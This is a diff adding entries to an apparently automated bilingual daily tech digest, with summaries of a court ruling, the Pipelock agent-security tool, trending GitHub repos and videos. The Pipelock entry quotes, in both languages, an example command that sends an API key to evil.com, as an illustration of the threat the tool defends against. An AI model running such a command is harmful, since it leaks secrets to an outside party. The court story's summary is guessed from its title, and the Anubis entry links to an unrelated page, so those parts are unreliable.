@@ -1,7 +1,7 @@
 ---
 title: "Daily Tech Digest: February 10, 2026"
 date: 2026-02-10
-description: "Today's digest: 12 Hacker News articles, 3 GitHub trending repos, 7 fast-moving projects, 10 YouTube videos, 0 Hugging Face models. 今日精选：12篇黑客新闻，3个热门项目，7个快速崛起项目，10个YouTube视频，0个Hugging Face模型。"
+description: "Today's digest: 15 Hacker News articles, 3 GitHub trending repos, 11 fast-moving projects, 12 YouTube videos, 0 Hugging Face models. 今日精选：15篇黑客新闻，3个热门项目，11个快速崛起项目，12个YouTube视频，0个Hugging Face模型。"
 categories: [Daily Digest]
 tags: [HackerNews, GitHub, YouTube, HuggingFace]
 pin: false
@@ -1166,4 +1166,329 @@ Vouch 是一个显式信任管理系统，要求贡献者在与项目特定部�
 * [内容似乎在提供的摘录之外继续]
 
 **[Read Original / 阅读原文](https://taggart-tech.com/discord-alternatives/)**
+
+<!-- [Title-Only] -->
+# Article Introduction Based on Title
+
+### Australian Author's Erotic Novel Is Child Sex Abuse Material, Judge Finds
+
+* **What this article likely covers:** Based on the title, this article appears to report on a legal case in Australia where a court has ruled that an erotic novel written by an Australian author constitutes child sexual abuse material (CSAM). The article likely discusses the court's reasoning, the nature of the content in question, and the legal implications of this ruling. It may also explore the boundaries between fiction and illegal content, particularly regarding depictions of minors in sexual contexts.
+
+* **Why it might be interesting to readers:** This case raises important questions about freedom of expression versus child protection laws in the digital age. It's particularly relevant for understanding how different jurisdictions handle written fictional content that depicts minors in sexual situations, even when no actual children are involved. The ruling could have significant implications for authors, publishers, and content platforms, and may spark debate about where society should draw the line between artistic expression and material that normalizes or promotes child exploitation.
+
+---
+
+### 澳大利亚作家的情色小说被法官认定为儿童性虐待材料
+
+* **根据标题推测的文章内容简介：** 从标题来看，这篇文章报道了澳大利亚的一起法律案件，法院裁定一位澳大利亚作家创作的情色小说构成儿童性虐待材料（CSAM）。文章可能讨论了法院的判决理由、涉案内容的性质以及这一裁决的法律影响。文章还可能探讨虚构作品与非法内容之间的界限，特别是涉及未成年人性描写的内容。
+
+* **为何值得关注：** 这个案件引发了关于言论自由与儿童保护法律之间关系的重要问题，在数字时代尤为相关。它有助于理解不同司法管辖区如何处理描写未成年人性行为的虚构文字内容，即使没有真实儿童参与其中。这一裁决可能对作家、出版商和内容平台产生重大影响，并可能引发关于社会应在何处划定艺术表达与助长或宣扬儿童剥削材料之间界限的辩论。
+
+**[Read Original / 阅读原文](https://www.bbc.com/news/articles/ckgzv529v5no)**
+
+### Pipelock: All-in-One Security Harness for AI Agents
+
+* **Core Problem**: AI agents with shell access and API keys can exfiltrate secrets with a single HTTP request (e.g., `curl "https://evil.com/steal?key=$ANTHROPIC_API_KEY"`)
+* **Solution Architecture**: Uses capability separation—agent process (has secrets) is network-restricted, while separate fetch proxy (NO secrets) handles web browsing through a 7-layer scanner pipeline
+* **Key Differentiators**: Single binary with zero dependencies; combines secret exfiltration prevention, DLP + entropy analysis, prompt injection detection, workspace integrity monitoring, and MCP response scanning
+* **Three Security Modes**: 
+  - **Strict**: Airtight security, no web browsing (regulated industries)
+  - **Balanced**: Blocks naive attacks, detects sophisticated ones via fetch proxy (default for most developers)
+  - **Audit**: Logging only, unrestricted access (evaluation phase)
+* **7-Layer URL Scanner Pipeline**: SSRF protection, domain blocklist, rate limiting, DLP patterns, environment variable leak detection, entropy analysis, URL length limits
+* **Response Scanning**: Detects prompt injection, system/role overrides, jailbreak attempts with configurable actions (block/strip/warn/ask)
+* **Additional Features**: File integrity monitoring (SHA256 manifests), Git protection with pre-push hooks, Ed25519 signing for multi-agent trust, MCP proxy wrapper for scanning server responses
+* **OWASP Agentic Top 10 Coverage**: Strong coverage for 6/10 threats (Prompt Injection, Privilege Escalation, Insecure Output Handling, Excessive Agency, Insufficient Logging, Resource Consumption); partial/moderate for remaining 4
+* **Quick Start**: Install via `go install`, generate config with presets (balanced/strict/audit), run proxy on localhost:8888, or use Docker image
+* **Multi-Agent Support**: Agent identification via headers/query params, per-agent audit logging and filtering
+* **Configuration Presets**: Includes ready-made configs for Claude Code, Cursor IDE, generic agents, and different security postures
+* **Honest Security Assessment**: Strict mode provides mathematical certainty; Balanced mode raises attack bar from "one curl command" to "sophisticated pre-planned attack"; Audit mode provides visibility
+
+---
+
+### Pipelock：AI 代理的一体化安全防护工具
+
+* **核心问题**：具有 Shell 访问权限和 API 密钥的 AI 代理可以通过单个 HTTP 请求泄露机密（例如 `curl "https://evil.com/steal?key=$ANTHROPIC_API_KEY"`）
+* **解决方案架构**：采用能力分离——代理进程（拥有机密）受网络限制，而独立的获取代理（无机密）通过 7 层扫描管道处理网页浏览
+* **核心差异化优势**：单一二进制文件零依赖；结合了机密泄露防护、DLP + 熵分析、提示词注入检测、工作区完整性监控和 MCP 响应扫描
+* **三种安全模式**：
+  - **严格模式**：密不透风的安全性，无网页浏览（适用于受监管行业）
+  - **平衡模式**：阻止简单攻击，通过获取代理检测复杂攻击（大多数开发者的默认选择）
+  - **审计模式**：仅记录日志，不受限制访问（评估阶段）
+* **7 层 URL 扫描管道**：SSRF 防护、域名黑名单、速率限制、DLP 模式匹配、环境变量泄露检测、熵分析、URL 长度限制
+* **响应扫描**：检测提示词注入、系统/角色覆盖、越狱尝试，支持可配置操作（阻止/剥离/警告/询问）
+* **附加功能**：文件完整性监控（SHA256 清单）、带预推送钩子的 Git 保护、用于多代理信任的 Ed25519 签名、用于扫描服务器响应的 MCP 代理包装器
+* **OWASP Agentic Top 10 覆盖**：对 6/10 威胁提供强覆盖（提示词注入、权限提升、不安全输出处理、过度代理、日志不足、资源消耗）；其余 4 项为部分/中等覆盖
+* **快速开始**：通过 `go install` 安装，使用预设生成配置（平衡/严格/审计），在 localhost:8888 运行代理，或使用 Docker 镜像
+* **多代理支持**：通过请求头/查询参数识别代理身份，支持按代理过滤的审计日志
+* **配置预设**：包含 Claude Code、Cursor IDE、通用代理和不同安全态势的现成配置
+* **诚实的安全评估**：严格模式提供数学确定性；平衡模式将攻击门槛从"一条 curl 命令"提升到"复杂的预谋攻击"；审计模式提供当前缺失的可见性
+
+**[Read Original / 阅读原文](https://github.com/luckyPipewrench/pipelock)**
+
+### Anubis: A Proof-of-Work Bot Protection System
+
+* **What is Anubis?** - Anubis is an open-source bot protection system designed to defend websites against aggressive AI scraping that causes server downtime and resource accessibility issues.
+
+* **How it works** - Uses a Proof-of-Work (PoW) scheme similar to Hashcash (originally proposed for email spam reduction), where individual users experience negligible load but mass scrapers face significantly increased computational costs.
+
+* **Technical approach** - The PoW challenge is a temporary "good enough" solution while developers work on more sophisticated detection methods, such as fingerprinting headless browsers through font rendering analysis.
+
+* **User requirements** - Requires modern JavaScript features to function properly; users must disable privacy plugins like JShelter that block these features for the protected domain.
+
+* **Current version** - The system is running Anubis version 1.19.1, developed by Techaro.
+
+### Anubis：基于工作量证明的机器人防护系统
+
+* **什么是 Anubis？** - Anubis 是一个开源的机器人防护系统，旨在保护网站免受 AI 公司激进爬虫的侵害，这些爬虫会导致服务器宕机并使资源无法访问。
+
+* **工作原理** - 采用类似 Hashcash 的工作量证明（PoW）机制（最初用于减少电子邮件垃圾），对个人用户影响微乎其微，但对大规模爬虫会大幅增加计算成本。
+
+* **技术方案** - 工作量证明挑战是一个临时的"足够好"的解决方案，开发团队正在研发更复杂的检测方法，例如通过字体渲染分析来识别无头浏览器。
+
+* **用户要求** - 需要现代 JavaScript 功能才能正常运行；用户必须禁用 JShelter 等会阻止这些功能的隐私插件。
+
+* **当前版本** - 系统运行的是由 Techaro 开发的 Anubis 1.19.1 版本。
+
+**[Read Original / 阅读原文](https://code.idtech.space/fn/hl2)**
+
+### LangExtract - LLM-Powered Structured Information Extraction with Source Grounding
+
+**What it does:**
+* Extracts structured information from unstructured text using Large Language Models (LLMs)
+* Maps every extracted entity to its exact location in the source text for precise traceability
+* Processes documents of any length, from short clinical notes to full novels, using optimized chunking and parallel processing
+* Generates interactive HTML visualizations to review extracted entities in their original context
+
+**Key features:**
+* **Precise Source Grounding**: Every extraction links to exact text locations with visual highlighting
+* **Reliable Structured Outputs**: Enforces consistent schema based on few-shot examples using controlled generation
+* **Long Document Optimization**: Handles "needle-in-a-haystack" challenges through text chunking, parallel processing, and multiple extraction passes
+* **Interactive Visualization**: Creates self-contained HTML files to explore thousands of extracted entities
+* **Flexible LLM Support**: Works with cloud models (Google Gemini, OpenAI) and local models (Ollama)
+* **Domain Adaptable**: Define extraction tasks for any domain using just a few examples—no fine-tuning required
+* **Batch Processing**: Supports Vertex AI Batch API for cost-effective large-scale processing
+
+**Why it's notable:**
+* Trending with **531 stars today** due to its unique combination of extraction accuracy and source traceability
+* Addresses a critical need in AI applications: verifiable, grounded information extraction from unstructured text
+* Particularly valuable for healthcare (clinical notes, radiology reports), legal documents, and research applications where source verification is essential
+* Developed by Google with production-ready features including parallel processing, multiple model support, and enterprise-grade batch APIs
+* Provides an elegant solution to LLM hallucination concerns through precise source grounding and visualization
+
+---
+
+### LangExtract - 基于大语言模型的结构化信息提取工具（带源文本定位）
+
+**功能介绍：**
+* 使用大语言模型从非结构化文本中提取结构化信息
+* 将每个提取的实体精确映射到源文本的确切位置，实现可追溯性
+* 处理任意长度的文档，从简短的临床笔记到完整小说，采用优化的分块和并行处理
+* 生成交互式 HTML 可视化界面，在原始上下文中审查提取的实体
+
+**主要特点：**
+* **精确源文本定位**：每个提取结果都链接到确切的文本位置，支持可视化高亮显示
+* **可靠的结构化输出**：基于少样本示例强制执行一致的输出模式，使用受控生成技术
+* **长文档优化**：通过文本分块、并行处理和多轮提取解决"大海捞针"难题
+* **交互式可视化**：创建独立的 HTML 文件，可探索数千个提取实体
+* **灵活的 LLM 支持**：支持云端模型（Google Gemini、OpenAI）和本地模型（Ollama）
+* **领域自适应**：仅需几个示例即可定义任何领域的提取任务，无需微调模型
+* **批处理支持**：支持 Vertex AI 批处理 API，实现大规模任务的成本优化
+
+**为何值得关注：**
+* **今日获得 531 星标**，因其独特的提取准确性和源文本可追溯性组合而快速走红
+* 解决了 AI 应用中的关键需求：从非结构化文本中进行可验证、有依据的信息提取
+* 对医疗保健（临床笔记、放射学报告）、法律文档和研究应用特别有价值，这些场景中源验证至关重要
+* 由 Google 开发，具备生产就绪特性，包括并行处理、多模型支持和企业级批处理 API
+* 通过精确的源文本定位和可视化，为 LLM 幻觉问题提供了优雅的解决方案
+
+**[View Repository / 查看仓库](https://github.com/google/langextract)**
+
+### GitHub Agentic Workflows (gh-aw) - AI-Powered GitHub Actions in Natural Language
+
+**What it does**
+* Enables developers to write AI-powered workflows in natural language markdown that execute within GitHub Actions
+* Allows AI agents to automate repository tasks like code reviews, issue triage, documentation updates, and more
+* Integrates AI capabilities directly into GitHub's native workflow infrastructure
+
+**Key features**
+* **Natural Language Workflows**: Write automation logic in plain markdown instead of YAML or code
+* **Multi-Layer Security**: Read-only by default with sandboxed execution, input sanitization, network isolation, and SHA-pinned dependencies
+* **Safe Outputs**: Write operations only allowed through sanitized `safe-outputs` mechanism
+* **Human-in-the-Loop**: Team-gated access with approval gates for critical operations
+* **Companion Tools**: Includes Agent Workflow Firewall (AWF) for network control and MCP Gateway for protocol routing
+* **GitHub CLI Extension**: Easy installation and management through `gh` command
+
+**Why it's notable**
+* **499 stars today** - Rapidly gaining traction as organizations explore AI automation
+* **Security-First Design**: Addresses the critical challenge of safely deploying AI agents in production environments
+* **GitHub Official Project**: Built by GitHub Next, indicating potential future integration into core GitHub features
+* **Practical AI Application**: Bridges the gap between AI capabilities and real-world DevOps workflows
+* **Innovative Approach**: Combines GitHub Actions' reliability with AI's flexibility while maintaining strict guardrails
+
+---
+
+### GitHub Agentic Workflows (gh-aw) - 用自然语言编写的 AI 驱动 GitHub 工作流
+
+**功能介绍**
+* 允许开发者用自然语言 Markdown 编写 AI 驱动的工作流，并在 GitHub Actions 中执行
+* 让 AI 代理自动化仓库任务，如代码审查、问题分类、文档更新等
+* 将 AI 能力直接集成到 GitHub 原生工作流基础设施中
+
+**主要特点**
+* **自然语言工作流**：用纯 Markdown 编写自动化逻辑，无需 YAML 或代码
+* **多层安全防护**：默认只读权限，配备沙箱执行、输入清理、网络隔离和 SHA 固定依赖
+* **安全输出机制**：写操作仅通过经过清理的 `safe-outputs` 机制允许
+* **人工监督**：团队权限控制，关键操作需要人工审批
+* **配套工具**：包含 Agent Workflow Firewall (AWF) 网络控制和 MCP Gateway 协议路由
+* **GitHub CLI 扩展**：通过 `gh` 命令轻松安装和管理
+
+**为何值得关注**
+* **今日获得 499 星** - 随着组织探索 AI 自动化而快速增长
+* **安全优先设计**：解决了在生产环境中安全部署 AI 代理的关键挑战
+* **GitHub 官方项目**：由 GitHub Next 构建，预示可能未来集成到 GitHub 核心功能
+* **实用的 AI 应用**：在 AI 能力和实际 DevOps 工作流之间架起桥梁
+* **创新方法**：将 GitHub Actions 的可靠性与 AI 的灵活性相结合，同时保持严格的安全边界
+
+**[View Repository / 查看仓库](https://github.com/github/gh-aw)**
+
+### Compound Engineering Plugin - Official Claude Code plugin marketplace for compound engineering workflows
+
+**What it does:**
+* A plugin marketplace for Claude Code that implements "compound engineering" — a development methodology where each unit of work makes subsequent work easier
+* Provides a structured workflow: Plan → Work → Review → Compound → Repeat
+* Converts Claude Code plugins to OpenCode and Codex formats for cross-platform compatibility
+* Syncs personal Claude Code configurations (skills and MCP servers) to other AI coding assistants
+
+**Key features:**
+* **Four core workflow commands**: `/workflows:plan` (detailed implementation planning), `/workflows:work` (execution with worktrees and task tracking), `/workflows:review` (multi-agent code review), `/workflows:compound` (document learnings for reuse)
+* **Cross-platform CLI tool**: Built with Bun/TypeScript to convert plugins between Claude Code, OpenCode, and Codex formats
+* **Configuration sync**: Automatically syncs personal skills and MCP servers from `~/.claude/` to other platforms via symlinks for real-time updates
+* **Philosophy-driven design**: Emphasizes 80% planning/review, 20% execution to prevent technical debt accumulation
+
+**Why it's notable:**
+* **Trending rapidly** with 406 stars today — addresses a critical pain point in AI-assisted development
+* **Inverts traditional development patterns**: Instead of accumulating technical debt, each feature makes the codebase easier to work with
+* **Backed by Every Inc**: Comes with detailed documentation and real-world case studies on compound engineering methodology
+* **Interoperability focus**: First major effort to bridge different AI coding assistant ecosystems (Claude Code, OpenCode, Codex)
+
+---
+
+### Compound Engineering Plugin - Claude Code 官方复合工程插件市场
+
+**功能介绍:**
+* 为 Claude Code 提供的插件市场,实现"复合工程"开发方法论——每个工作单元都让后续工作变得更容易
+* 提供结构化工作流:计划 → 工作 → 审查 → 复合 → 重复
+* 将 Claude Code 插件转换为 OpenCode 和 Codex 格式,实现跨平台兼容
+* 将个人 Claude Code 配置(技能和 MCP 服务器)同步到其他 AI 编码助手
+
+**主要特点:**
+* **四个核心工作流命令**: `/workflows:plan`(详细实现规划)、`/workflows:work`(使用工作树和任务跟踪执行)、`/workflows:review`(多代理代码审查)、`/workflows:compound`(记录学习内容以供复用)
+* **跨平台 CLI 工具**: 使用 Bun/TypeScript 构建,可在 Claude Code、OpenCode 和 Codex 格式之间转换插件
+* **配置同步**: 通过符号链接自动将 `~/.claude/` 中的个人技能和 MCP 服务器同步到其他平台,实现实时更新
+* **哲学驱动设计**: 强调 80% 规划/审查、20% 执行,以防止技术债务累积
+
+**为何值得关注:**
+* **快速走红**,今日获得 406 星——解决了 AI 辅助开发中的关键痛点
+* **颠覆传统开发模式**: 不是累积技术债务,而是让每个功能都使代码库更易于使用
+* **Every Inc 支持**: 提供详细文档和复合工程方法论的真实案例研究
+* **注重互操作性**: 首个连接不同 AI 编码助手生态系统(Claude Code、OpenCode、Codex)的重大尝试
+
+**[View Repository / 查看仓库](https://github.com/EveryInc/compound-engineering-plugin)**
+
+### The Vibe Companion - Web UI for Claude Code via Reverse-Engineered WebSocket Protocol
+
+**What it does**
+* Brings Claude Code (Anthropic's AI coding assistant) to your browser by reverse-engineering its hidden WebSocket protocol
+* Spawns and manages Claude Code CLI processes through a web interface, eliminating the need for terminal-only interaction
+* Enables running Claude Code using your existing subscription without requiring separate API keys
+
+**Key features**
+* **Multi-session management**: Run multiple Claude Code instances simultaneously, each with independent processes, models, and permission settings
+* **Real-time streaming**: Token-by-token response rendering with live visual feedback
+* **Tool call transparency**: Visual display of all Bash commands, file operations, and edits with syntax highlighting in collapsible blocks
+* **Hierarchical subagent tracking**: Nested visualization when agents spawn sub-agents
+* **Granular permission control**: Four permission modes from full auto-approval to manual approval per tool call
+* **Session persistence**: Auto-recovery with `--resume` flag after crashes or restarts
+* **Environment profiles**: Per-project configuration storage in `~/.companion/envs/`
+* **One-command setup**: `bunx the-vibe-companion` launches everything on localhost:3456
+
+**Why it's notable**
+* Solves major UX limitations of Claude Code's terminal-only interface (no multi-session support, poor visibility, context loss on crashes)
+* Impressive reverse-engineering effort: fully documented the undocumented NDJSON WebSocket protocol with 13 control subtypes
+* Mobile-friendly: works in any browser, enabling AI coding assistance on phones/tablets
+* Modern tech stack: Built with Bun, Hono, React 19, Zustand, and Tailwind v4
+* 1000+ stars in short time indicates strong developer demand for better Claude Code tooling
+
+---
+
+### The Vibe Companion - 基于逆向工程 WebSocket 协议的 Claude Code 网页界面
+
+**功能介绍**
+* 通过逆向工程 Claude Code 隐藏的 WebSocket 协议，将 Anthropic 的 AI 编码助手带到浏览器中
+* 通过 Web 界面生成和管理 Claude Code CLI 进程，摆脱终端限制
+* 使用现有的 Claude Code 订阅即可运行，无需单独的 API 密钥
+
+**主要特点**
+* **多会话管理**：同时运行多个 Claude Code 实例，每个实例拥有独立的进程、模型和权限设置
+* **实时流式传输**：逐 token 渲染响应，提供实时视觉反馈
+* **工具调用可视化**：以可折叠块形式展示所有 Bash 命令、文件操作和编辑，支持语法高亮
+* **子代理层级追踪**：当代理生成子代理时，以层级结构可视化其工作流程
+* **精细权限控制**：提供四种权限模式，从完全自动批准到每次工具调用手动批准
+* **会话持久化**：支持 `--resume` 标志，在崩溃或重启后自动恢复
+* **环境配置文件**：在 `~/.companion/envs/` 中存储项目级配置
+* **一键启动**：执行 `bunx the-vibe-companion` 即可在 localhost:3456 启动全部功能
+
+**为何值得关注**
+* 解决了 Claude Code 终端界面的重大用户体验问题（无多会话支持、可见性差、崩溃后丢失上下文）
+* 令人印象深刻的逆向工程成果：完整记录了未公开的 NDJSON WebSocket 协议，包含 13 种控制子类型
+* 移动端友好：可在任何浏览器中运行，支持在手机/平板上使用 AI 编码辅助
+* 现代技术栈：采用 Bun、Hono、React 19、Zustand 和 Tailwind v4 构建
+* 短时间内获得 1000+ star，表明开发者对更好的 Claude Code 工具有强烈需求
+
+**[View Repository / 查看仓库](https://github.com/The-Vibe-Company/companion)**
+
+### 🎬 Is it worth learning to code?
+
+**Channel:** Lenny's Podcast
+
+* **What the video covers:** This video explores the relevance and value of learning to code in the age of AI, addressing whether coding skills remain a worthwhile investment for aspiring developers and tech professionals.
+
+* **Key topics discussed:** The impact of AI tools on software development, the concept of "vibe coding" (likely referring to AI-assisted or intuitive coding approaches), the evolving role of programmers, and practical considerations for those deciding whether to pursue coding skills in 2026.
+
+* **Why it's worth watching:** Essential viewing for anyone considering a tech career or wondering how AI is reshaping software development. Provides timely insights into whether traditional coding skills still matter when AI can generate code, helping viewers make informed decisions about their learning path and career investments.
+
+---
+
+### 🎬 学习编程还值得吗？
+
+**频道:** Lenny's Podcast
+
+* **视频内容概述:** 本视频探讨在AI时代学习编程的相关性和价值，讨论对于有志于成为开发者和科技专业人士来说，编程技能是否仍然值得投资。
+
+* **主要话题:** AI工具对软件开发的影响、"氛围编程"概念（可能指AI辅助或直觉式编程方法）、程序员角色的演变，以及那些正在决定是否学习编程的人需要考虑的实际因素。
+
+* **为何值得观看:** 对于任何考虑从事科技职业或想了解AI如何重塑软件开发的人来说，这是必看内容。提供了关于当AI可以生成代码时传统编程技能是否仍然重要的及时见解，帮助观众对学习路径和职业投资做出明智决策。
+
+**[Watch Video / 观看视频](https://www.youtube.com/watch?v=xLmkKFjgKzg)**
+
+### 🎬 Kubernetes Course – Certified Kubernetes Administrator Exam Preparation (2026 Update)
+
+**Channel:** freeCodeCamp.org
+
+* **What the video covers:** This comprehensive course teaches Kubernetes fundamentals and provides complete preparation for the Certified Kubernetes Administrator (CKA) examination with 2026-updated content
+* **Key topics discussed:** Kubernetes architecture, cluster administration, pod management, networking, storage, security, troubleshooting, and hands-on practice aligned with the latest CKA exam curriculum
+* **Why it's worth watching:** Perfect for aspiring Kubernetes administrators seeking industry-recognized certification; offers free, up-to-date exam preparation from freeCodeCamp's trusted platform with practical, hands-on learning approach essential for passing the CKA exam
+
+---
+
+### 🎬 Kubernetes 课程 – Kubernetes 管理员认证考试备考（2026 更新版）
+
+**频道:** freeCodeCamp.org
+
+* **视频内容概述:** 这是一门全面的 Kubernetes 课程，教授 Kubernetes 基础知识，并提供 2026 年最新版本的 Kubernetes 管理员认证（CKA）考试完整备考内容
+* **主要话题:** Kubernetes 架构、集群管理、Pod 管理、网络配置、存储管理、安全机制、故障排查，以及与最新 CKA 考试大纲对齐的实操练习
+* **为何值得观看:** 适合希望获得行业认可的 Kubernetes 管理员认证的学习者；由 freeCodeCamp 可信平台提供的免费、最新考试备考资源，注重实践操作，是通过 CKA 考试的必备学习材料
+
+**[Watch Video / 观看视频](https://www.youtube.com/watch?v=l57xKN6OBhY)**
 
